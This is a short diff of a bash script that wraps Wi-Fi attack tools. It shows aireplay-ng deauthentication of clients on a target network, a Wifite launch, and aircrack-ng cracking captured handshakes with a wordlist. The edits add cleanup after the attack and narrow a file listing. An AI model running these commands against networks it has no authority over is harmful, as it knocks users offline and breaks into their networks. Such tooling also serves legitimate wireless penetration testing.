@@ -257,6 +257,8 @@ echo -e "\e[32mAttacking...\e[0m"
 sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
 captureMAC
 deauthAttack
+sudo airmon-ng stop $foo > /dev/null 2>&1
+sudo systemctl start NetworkManager > /dev/null 2>&1
 stopMon
 checkservices
 checkWiFiStatus
@@ -360,7 +362,7 @@ sudo ./Wifite.py
 crack () {
 echo "Your current directory:"
 pwd
-ls
+ls *.txt
 read -p "Enter path to wordlist : " wordlist
  $wordlist
 sudo aircrack-ng -w $wordlist *.cap
